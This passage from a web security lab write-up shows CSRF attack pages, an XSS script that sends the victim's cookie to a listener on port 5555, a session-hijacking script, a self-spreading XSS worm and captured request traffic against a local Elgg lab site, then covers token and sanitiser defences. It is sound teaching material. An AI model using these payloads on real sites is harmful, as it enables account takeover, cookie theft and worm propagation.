aria-hidden="true">image-20240619224859567</figcaption></figure><h3 id="task-2-csrf-attack-using-post-request"><strong>Task 2: CSRFAttack Using POST Request</strong></h3><p>Still log in to Samy’s account first, then modify the personalhomepage below, perform POST request packet capture, and get thefollowing results.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619230611400.png"alt="image-20240619230611400" /><figcaption aria-hidden="true">image-20240619230611400</figcaption></figure><p>POST request sent to http://www.csrflabelgg.com/action/profile/edit,the submitted form content is as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=2G9AraT4cb7pPqONMfz3sQ</span><br><span class="line">&amp;__elgg_ts=<span class="number">1718837884</span></span><br><span class="line">&amp;name=Samy</span><br><span class="line">&amp;description=&lt;p&gt;A Hacker&lt;/p&gt;</span><br><span class="line">&amp;accesslevel[description]=<span class="number">2</span></span><br><span class="line">&amp;briefdescription=Student</span><br><span class="line">&amp;accesslevel[briefdescription]=<span class="number">2</span></span><br><span class="line">&amp;location=Wuhan</span><br><span class="line">&amp;accesslevel[location]=<span class="number">2</span></span><br><span class="line">&amp;interests=Football</span><br><span class="line">&amp;accesslevel[interests]=<span class="number">2</span></span><br><span class="line">&amp;skills=python</span><br><span class="line">&amp;accesslevel[skills]=<span class="number">2</span></span><br><span class="line">&amp;contactemail=U202112149@hust.edu.cn</span><br><span class="line">&amp;accesslevel[contactemail]=<span class="number">2</span></span><br><span class="line">&amp;phone=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[phone]=<span class="number">2</span></span><br><span class="line">&amp;mobile=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[mobile]=<span class="number">2</span></span><br><span class="line">&amp;website=https://strivelee.top</span><br><span class="line">&amp;accesslevel[website]=<span class="number">2</span></span><br><span class="line">&amp;twitter=lixiang21</span><br><span class="line">&amp;accesslevel[twitter]=<span class="number">2</span></span><br><span class="line">&amp;guid=<span class="number">45</span></span><br></pre></td></tr></table></figure><p>Based on this request format, Alice’s guid is known to be 43, try touse POST request for CSRF attack.</p><p>First create get_csrf.html under Attacker site</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure><p>Write the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, your profile has changed!</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">guid</span>:<span class="number">42</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">description</span>:<span class="string">&quot;&lt;p&gt;Samy is my hero&lt;/p&gt;&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">briefdescription</span>:<span class="string">&quot;I&#x27;m Samy&quot;</span>,   </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>Samy sends Alice an email, inducing Alice to click the malicious linkhttp://www.csrflabattacker.com/post_csrf.html</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232506107.png"alt="image-20240619232506107" /><figcaption aria-hidden="true">image-20240619232506107</figcaption></figure><p>Log in to Alice’s account, then view and click the link in theemail.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232629475.png"alt="image-20240619232629475" /><figcaption aria-hidden="true">image-20240619232629475</figcaption></figure><p>We can see that the About me section was successfully modified, andthe POST request packet was captured, which is consistent with thephenomenon.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232821090.png"alt="image-20240619232821090" /><figcaption aria-hidden="true">image-20240619232821090</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620230509435.png"alt="image-20240620230509435" /><figcaption aria-hidden="true">image-20240620230509435</figcaption></figure><h3 id="task-3-implement-login-csrf-attack"><strong>Task 3: ImplementLogin CSRF Attack</strong></h3><p>First capture the login request packet, the corresponding requestmethod is POST, url is http://www.csrflabelgg.com/action/login, therequest form has username and password, both are plaintext.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620164209052.png"alt="image-20240620164209052" /><figcaption aria-hidden="true">image-20240620164209052</figcaption></figure><p>Form data content is as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=5ovl8du9mM-5V1rwIDhJsg</span><br><span class="line">__elgg_ts=<span class="number">1718872774</span></span><br><span class="line">username=Samy</span><br><span class="line">password=seedsamy</span><br></pre></td></tr></table></figure><p>First create get_csrf.html under Attacker site</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure><p>Write the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, here is a CSRF_Login attack!  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Send POST request  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Carry cookie  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/login&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">       <span class="comment">// Pass parameters  </span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">username</span>:<span class="string">&quot;samy&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">password</span>:<span class="string">&quot;seedsamy&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persistent</span>:<span class="literal">true</span>,    </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>Samy sends Alice an email, inducing Alice to click the malicious linkhttp://www.csrflabattacker.com/login_csrf.html</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620222327448.png"alt="image-20240620222327448" /><figcaption aria-hidden="true">image-20240620222327448</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223041289.png"alt="image-20240620223041289" /><figcaption aria-hidden="true">image-20240620223041289</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223149485.png"alt="image-20240620223149485" /><figcaption aria-hidden="true">image-20240620223149485</figcaption></figure><h3 id="task-4-defense-strategy"><strong>Task 4: DefenseStrategy</strong></h3><p>First enter the directory/var/www/CSRF/Elgg/vendor/elgg/elgg/engine/classes/Elgg, find thefunction gatekeeper() in ActionService.php file and comment out thereturn true statement</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620231737340.png"alt="image-20240620231737340" /><figcaption aria-hidden="true">image-20240620231737340</figcaption></figure><p>All 3 attacks failed:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232609700.png"alt="image-20240620232609700" /><figcaption aria-hidden="true">image-20240620232609700</figcaption></figure><p>GET request has no token:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232620176.png"alt="image-20240620232620176" /><figcaption aria-hidden="true">image-20240620232620176</figcaption></figure><p>POST request has no token:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232830171.png"alt="image-20240620232830171" /><figcaption aria-hidden="true">image-20240620232830171</figcaption></figure><p>Login has no token:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232359807.png"alt="image-20240620232359807" /><figcaption aria-hidden="true">image-20240620232359807</figcaption></figure><h2 id="cross-site-scripting-xss-attack-experiment"><strong>Cross-SiteScripting (XSS) Attack Experiment</strong></h2><p>First need to switch websites, switch tohttp://www.xsslabelgg.com.</p><h3 id="task-1-steal-cookie-from-victims-machine"><strong>Task 1: StealCookie from Victim’s Machine</strong></h3><p>Use samy to log in, modify samy’s profile. In the About me field,first click Edit HTML, add the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=http://127.0.0.1:5555?c=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) +  <span class="string">&#x27;&gt;&#x27;</span>); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102354596.png"alt="image-20240621102354596" /><figcaption aria-hidden="true">image-20240621102354596</figcaption></figure><p>Switch to Alice and view Samy’s homepage, use nc to listen on port5555 <code>nc -l 5555 -v</code> to view packet information, HTTP HeaderLive also works.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102835358.png"alt="image-20240621102835358" /><figcaption aria-hidden="true">image-20240621102835358</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621103053599.png"alt="image-20240621103053599" /><figcaption aria-hidden="true">image-20240621103053599</figcaption></figure><h3id="task-2-use-ajax-script-to-automatically-initiate-session-hijacking"><strong>Task2: Use Ajax Script to Automatically Initiate SessionHijacking</strong></h3><p>Use samy to log in, modify samy’s profile. In the About me field,first click Edit HTML, add the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>Then, switch to using Alice to log in, open Samy’s homepage fromAlice’s interface to view. Through the HTTP Header Live plugin, it wasfound that a POST request to modify brief description has been sent out,achieving the attack effect. The sent HTTP packet:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621104726870.png"alt="image-20240621104726870" /><figcaption aria-hidden="true">image-20240621104726870</figcaption></figure><h3 id="task-3-construct-xss-worm"><strong>Task 3: Construct XSSWorm</strong></h3><p>Use samy to log in, modify samy’s profile. In the About me field,first click Edit HTML, add the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&#x27;worm&#x27;</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">description</span>: <span class="string">&quot;&lt;script id=&#x27;worm&#x27;&gt;&quot;</span> + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;worm&#x27;</span>).<span class="property">innerHTML</span> + <span class="string">&quot;&lt;\/script&gt;&quot;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">3000</span>)  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>Then, switch to using Alice to log in, open Samy’s homepage fromAlice’s interface to view. Through the HTTP Header Live plugin, it wasfound that a POST request to modify brief description has been sent out,achieving the attack effect. The sent HTTP packet:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621105412187.png"alt="image-20240621105412187" /><figcaption aria-hidden="true">image-20240621105412187</figcaption></figure><p>Unlike the above, the description field of this POST packet wasmodified to the malicious XSS script itself, thus creatingpropagability. The specific content of the packet modifying Alice’sProfile is as follows.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621110705476.png"alt="image-20240621110705476" /><figcaption aria-hidden="true">image-20240621110705476</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http://www.xsslabelgg.com/action/profile/edit</span><br><span class="line">Host: www.xsslabelgg.com</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.xsslabelgg.com/profile/samy</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">origin: http://www.xsslabelgg.com</span><br><span class="line">Content-Length: 1136</span><br><span class="line">Cookie: Elgg=jl5l97kq1k4todunjgn0ek8ft0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">__elgg_ts=1718938378&amp;__elgg_token=P-0B7cbe_msL5vOGF0n8AQ&amp;guid=44&amp;briefdescription=Samy is my hero&amp;description=&lt;script id=&#x27;worm&#x27;&gt;  </span><br><span class="line">    setTimeout(() =&gt; &#123;  </span><br><span class="line">        var ts = elgg.security.token.__elgg_ts;  </span><br><span class="line">        var token = elgg.security.token.__elgg_token;  </span><br><span class="line">        var guid = elgg.session.user.guid;  </span><br><span class="line">        fetch(&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;, &#123;  </span><br><span class="line">            credentials: &#x27;include&#x27;,  </span><br><span class="line">            method: &#x27;POST&#x27;,  </span><br><span class="line">            headers: &#123;  </span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            body: new URLSearchParams(&#123;  </span><br><span class="line">                __elgg_ts: ts,  </span><br><span class="line">                __elgg_token: token,  </span><br><span class="line">                guid: guid,  </span><br><span class="line">                briefdescription: &quot;Samy is my hero&quot;,  </span><br><span class="line">                description: &quot;&lt;script id=&#x27;worm&#x27;&gt;&quot; + document.getElementById(&#x27;worm&#x27;).innerHTML + &quot;&lt;\/script&gt;&quot;  </span><br><span class="line">            &#125;)  </span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;, 3000)  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">POST: HTTP/1.1 302 Found</span><br><span class="line">Date: Fri, 21 Jun 2024 02:53:01 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Location: http://www.xsslabelgg.com/profile/alice</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout=5, max=97</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br></pre></td></tr></table></figure><p>Log in as Boby and access Alice’s profile, can also get the POSTpacket modifying the profile and Boby’s introduction was also modifiedto the same sentence:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111233972.png"alt="image-20240621111233972" /><figcaption aria-hidden="true">image-20240621111233972</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111431159.png"alt="image-20240621111431159" /><figcaption aria-hidden="true">image-20240621111431159</figcaption></figure><h3 id="task-4-defense-strategy-1"><strong>Task 4: DefenseStrategy</strong></h3><h4 id="only-enable-htmlawed-1.9">Only Enable HTMLawed 1.9</h4>Elgg has default defense strategies. The virtual machine has disabledand commented out the corresponding defense strategies. In fact, theElgg web application originally enables a customized security pluginHTMLawed, which validates user input and removes tags from the input.This specific plugin is registered to the filter tags function in theelgg/engine/lib/input.php file. For example, it converts tags like<script>to<p><p>so that JavaScript scripts cannot be executed.</p><p>Go to Account→administration (top menu)→plugins (on the right panel),then select security and spam from the dropdown menu and click filter.Find the HTMLawed 1.8 plugin below. Click Activate to enable thestrategy.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120050952.png"alt="image-20240621120050952" /><figcaption aria-hidden="true">image-20240621120050952</figcaption></figure><p>Visit Samy’s homepage again and try to modify, found that script tagswere converted to p tags, the inserted js statement format was convertedand cannot be executed.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120305885.png"alt="image-20240621120305885" /><figcaption aria-hidden="true">image-20240621120305885</figcaption></figure><h4 id="enable-htmlawed-1.9-and-htmlspecialchars">Enable HTMLawed 1.9and htmlspecialchars</h4><p>The <code>htmlspecialchars</code> function converts the followingspecial characters to corresponding HTML entities:</p><ul><li><code>&amp;</code> converts to &amp;amp;</li><li><code>&lt;</code> converts to &amp;lt;</li><li><code>&gt;</code> converts to &amp;gt;</li><li><code>"</code> converts to &amp;quot;</li><li><code>'</code> converts to &amp;#039;</li></ul><p>We enter the directory<code>/var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</code> assuperuser in the virtual machine, use vim to enter the files that callthe <code>htmlspecialchars()</code> function: text.php, url.php,dropdown.php, email.php. In each file, uncomment the 